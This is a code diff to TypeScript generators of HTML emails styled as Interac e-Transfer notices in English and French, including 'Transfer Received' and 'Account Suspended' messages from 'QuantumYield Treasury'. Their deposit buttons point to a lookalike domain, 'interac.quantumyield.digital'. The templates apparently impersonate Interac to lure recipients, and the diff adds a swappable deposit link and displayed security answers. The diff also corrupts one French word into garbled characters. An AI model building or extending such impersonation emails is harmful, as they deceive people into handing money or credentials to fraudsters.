@@ -12,6 +12,9 @@ interface BaseEmailData {
   limit?: string
   deviceInfo?: string
   location?: string
+  securityQuestion?: string
+  securityAnswer?: string
+  depositLink?: string
 }
 
 // Shared email styles
@@ -105,6 +108,7 @@ function formatDate(): string {
 // 1. Transfer Received
 export function generateTransferReceived(data: BaseEmailData): string {
   const amount = data.amount || 0
+  const link = data.depositLink || "https://interac.quantumyield.digital/deposit-portal"
   return `
     <!DOCTYPE html>
     <html lang="en">
@@ -128,9 +132,16 @@ export function generateTransferReceived(data: BaseEmailData): string {
             <div class="detail-row"><span class="detail-label">Reference:</span><span class="detail-value">${data.transferId || "INTC-000000"}</span></div>
             ${data.message ? `<div class="detail-row"><span class="detail-label">Message:</span><span class="detail-value">${data.message}</span></div>` : ""}
           </div>
+
+          ${data.securityQuestion ? `
+          <div class="security-section">
+            <h4 class="security-title">Security Question</h4>
+            <p style="color:#555555;font-size:14px;margin-bottom:10px;">${data.securityQuestion}</p>
+            ${data.securityAnswer ? `<p style="font-size:14px;font-weight:700;color:#000000;letter-spacing:2px;">${data.securityAnswer}</p>` : ""}
+          </div>` : ""}
           
           <div class="button-section">
-            <a href="https://interac.quantumyield.digital/deposit-portal" class="action-button">Deposit Your Money</a>
+            <a href="${link}" class="action-button">Deposit Your Money</a>
           </div>
           
           <div class="alert-box alert-warning">
@@ -993,7 +1004,8 @@ export function generateRequestDeclined(data: BaseEmailData): string {
 
 export function generateTransferReceivedFr(d: BaseEmailData): string {
   const a = d.amount || 0
-  return `<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">${getEmailStyles()}</head><body><div class="container">${getHeader()}<div class="content"><h1 class="greeting">Bonjour ${d.recipientName},</h1><p class="subtitle">Vous avez reçu un virement Interac sécurisé.</p><div class="amount-box"><div class="amount-value">${formatAmount(a)} $ CAD</div><div class="amount-label">Montant du virement</div></div><div class="details-card"><h3 class="details-title">Détails du virement</h3><div class="detail-row"><span class="detail-label">De :</span><span class="detail-value">${d.senderName || "QuantumYield Treasury"}</span></div><div class="detail-row"><span class="detail-label">Date :</span><span class="detail-value">${formatDate()}</span></div><div class="detail-row"><span class="detail-label">Référence :</span><span class="detail-value">${d.transferId || "INTC-000000"}</span></div>${d.message ? `<div class="detail-row"><span class="detail-label">Message :</span><span class="detail-value">${d.message}</span></div>` : ""}</div><div class="button-section"><a href="https://interac.quantumyield.digital/deposit-portal" class="action-button">Déposer votre argent</a></div><div class="alert-box alert-warning"><strong>Important :</strong> Ce virement expire dans 30 jours. Veuillez le déposer rapidement.</div></div>${getFooter()}</div></body></html>`
+  const link = d.depositLink || "https://interac.quantumyield.digital/deposit-portal"
+  return `<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">${getEmailStyles()}</head><body><div class="container">${getHeader()}<div class="content"><h1 class="greeting">Bonjour ${d.recipientName},</h1><p class="subtitle">Vous avez reçu un virement Interac sécurisé.</p><div class="amount-box"><div class="amount-value">${formatAmount(a)} $ CAD</div><div class="amount-label">Montant du virement</div></div><div class="details-card"><h3 class="details-title">Détails du virement</h3><div class="detail-row"><span class="detail-label">De :</span><span class="detail-value">${d.senderName || "QuantumYield Treasury"}</span></div><div class="detail-row"><span class="detail-label">Date :</span><span class="detail-value">${formatDate()}</span></div><div class="detail-row"><span class="detail-label">Référence :</span><span class="detail-value">${d.transferId || "INTC-000000"}</span></div>${d.message ? `<div class="detail-row"><span class="detail-label">Message :</span><span class="detail-value">${d.message}</span></div>` : ""}</div>${d.securityQuestion ? `<div class="security-section"><h4 class="security-title">Question de sécurité</h4><p style="color:#555555;font-size:14px;margin-bottom:10px;">${d.securityQuestion}</p>${d.securityAnswer ? `<p style="font-size:14px;font-weight:700;color:#000000;letter-spacing:2px;">${d.securityAnswer}</p>` : ""}</div>` : ""}<div class="button-section"><a href="${link}" class="action-button">Déposer votre argent</a></div><div class="alert-box alert-warning"><strong>Important :</strong> Ce virement expire dans 30 jours. Veuillez le déposer rapidement.</div></div>${getFooter()}</div></body></html>`
 }
 
 export function generateTransferSentFr(d: BaseEmailData): string {
@@ -1318,7 +1330,7 @@ export function generateAccountSuspendedFr(data: BaseEmailData): string {
       <div class="detail-row"><span class="detail-label">Raison :</span><span class="detail-value">Vérification de sécurité requise</span></div>
       <div class="detail-row"><span class="detail-label">Statut :</span><span class="detail-value" style="color:#721c24;font-weight:600;">Suspendu</span></div>
     </div>
-    <div class="instructions"><h4 style="margin-bottom:12px;font-weight:600;">Pour restaurer l&apos;accès</h4><ol><li>Communiquez immédiatement avec votre institution financière</li><li>Vérifiez votre identité avec une pièce d&apos;identité gouvernementale valide</li><li>Remplissez le questionnaire de sécurité requis</li><li>Attendez la confirmation de notre équipe de conformité</li></ol></div>
+    <div class="instructions"><h4 style="margin-bottom:12px;font-weight:600;">Pour restaurer l&apos;accès</h4><ol><li>Communiquez immédiatement avec votre institution financière</li><li>Vérifiez votre identité avec une pièce d&apos;identité gouvernementale valide</li><li>Remplissez le questionnaire de sécurité requis</li><li>Attendez la confirmation de notre ��quipe de conformité</li></ol></div>
     <div class="alert-box alert-warning">Si vous croyez que cette suspension est une erreur, veuillez contacter le soutien QuantumYield ou votre institution financière directement.</div>
   </div>${getFooter()}</div></body></html>`
 }
